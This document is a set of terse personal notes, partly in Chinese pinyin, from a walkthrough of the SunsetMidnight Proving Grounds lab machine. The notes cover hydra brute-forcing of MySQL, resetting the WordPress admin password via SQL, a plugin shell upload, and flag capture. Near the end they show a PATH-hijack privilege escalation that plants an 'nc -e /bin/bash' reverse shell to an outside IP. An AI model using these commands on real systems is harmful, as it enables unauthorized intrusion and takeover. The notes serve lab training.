参考教程：https://cyberarri.com/2024/07/20/sunsetmidnight-pg-play/
 
SunsetMidnight  
MariaDB [wordpress_db]\> update wp_users set user_pass="5f4dcc3b5aa765d61d8327deb882cf99" where id=1;  
Query OK, 1 row affected (0.095 sec)  
Rows matched: 1 Changed: 1 Warnings: 0
 
MariaDB [wordpress_db]\>
    
denglu  
[http://sunset-midnight/wp-login.php?redirect_to=http%3A%2F%2Fsunset-midnight%2Fwp-admin%2F&action=confirm_admin_email&wp_lang=en_US](http://sunset-midnight/wp-login.php?redirect_to=http%3A%2F%2Fsunset-midnight%2Fwp-admin%2F&action=confirm_admin_email&wp_lang=en_US)
   

[https://cyberarri.com/2024/07/20/sunsetmidnight-pg-play/](https://cyberarri.com/2024/07/20/sunsetmidnight-pg-play/)
      

[https://rydzak.me/2021/01/proving-grounds-walkthrough-sunsetmidnight/](https://rydzak.me/2021/01/proving-grounds-walkthrough-sunsetmidnight/)
      

192.168.134.88
 
使用插件进行上传 shell需要自己创建 自己创建一个
    
mysql  
root:robert
 
┌──(kali㉿kali)-[~/Desktop/pg02/SunsetMidnight]  
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.196.88  
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2025-11-15 23:10:25  
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)  
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task  
[DATA] attacking mysql://192.168.196.88:3306/  
[3306][mysql] host: 192.168.196.88 login: root password: robert  
1 of 1 target successfully completed, 1 valid password found  
Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) finished at 2025-11-15 23:10:40   ┌──(kali㉿kali)-[~/Desktop/pg02/SunsetMidnight]  
└─$
   

admin  
iloveyou
   

┌──(kali㉿kali)-[~/Desktop/pg02/SunsetMidnight]  
└─$ openssl passwd cacse  
$1$2p0Fn0XF$hXha5.MDmM51vo64dUAhw1  
 
gengxin
 
UPDATE wp_users SET user_pass = MD5('test') WHERE wp_users.user_login = "admin";
   

functions.php
   

[http://sunset-midnight//wp-content/plugins/akismet/akismet.php](http://sunset-midnight//wp-content/plugins/akismet/akismet.php)
 
5f4dcc3b5aa765d61d8327deb882cf99
 
MariaDB [wordpress_db]\>  
MariaDB [wordpress_db]\>  
MariaDB [wordpress_db]\> show tables;  
+------------------------+  
| Tables_in_wordpress_db |  
+------------------------+  
| wp_commentmeta |  
| wp_comments |  
| wp_links |  
| wp_options |  
| wp_postmeta |  
| wp_posts |  
| wp_sp_polls |  
| wp_term_relationships |  
| wp_term_taxonomy |  
| wp_termmeta |  
| wp_terms |  
| wp_usermeta |  
| wp_users |  
+------------------------+  
13 rows in set (0.134 sec)
 
MariaDB [wordpress_db]\> select * from wp_users;  
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+  
| ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name |  
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+  
| 1 | admin | $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ | admin | example@example.com | [http://sunset-midnight](http://sunset-midnight) | 2020-07-16 19:10:47 | | 0 | admin |  
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+  
1 row in set (0.087 sec)
 
MariaDB [wordpress_db]\> UPDATE wp_users SET user_pass = MD5('test') WHERE wp_users.user_login = "admin";  
Query OK, 1 row affected (0.085 sec)  
Rows matched: 1 Changed: 1 Warnings: 0
 
MariaDB [wordpress_db]\> select * from wp_users;  
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+  
| ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name |  
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+  
| 1 | admin | $P$BbpCHqjG9PqWaV.bASc35dzSYhNKjm/ | admin | example@example.com | [http://sunset-midnight](http://sunset-midnight) | 2020-07-16 19:10:47 | | 0 | admin |  
+----+------------+------------------------------------+---------------+---------------------+------------------------+---------------------+---------------------+-------------+--------------+  
1 row in set (0.083 sec)
 
MariaDB [wordpress_db]\>
    
www-data@midnight:/home/jose$ cat local.txt  
cat local.txt  
9d46a97e45b7b373dc4e1a778ba2bd53  
www-data@midnight:/home/jose$
 
chajian zhijie charu
 
which python  
python -c 'import pty; pty.spawn("/bin/bash")'  
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp  
export TERM=xterm-256color
   

stty raw -echo ; fg ; reset  
stty columns 200 rows 200
   

645dc5a8871d2a4269d4cbe23f6ae103
 
jose@midnight:/tmp$ export PATH="/tmp:$PATH"  
export PATH="/tmp:$PATH"  
jose@midnight:/tmp$ echo $PATH  
echo $PATH  
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
jose@midnight:/tmp$ /usr/bin/status
 
echo "nc -e /bin/bash 192.168.45.176 4445" \> service  
chmod +x service  
/usr/bin/status
      

cd /root  
ls  
proof.txt  
root.txt  
status  
status.c  
cat proof.txt  
f03dfed099749fdcba0af11a845ee6bf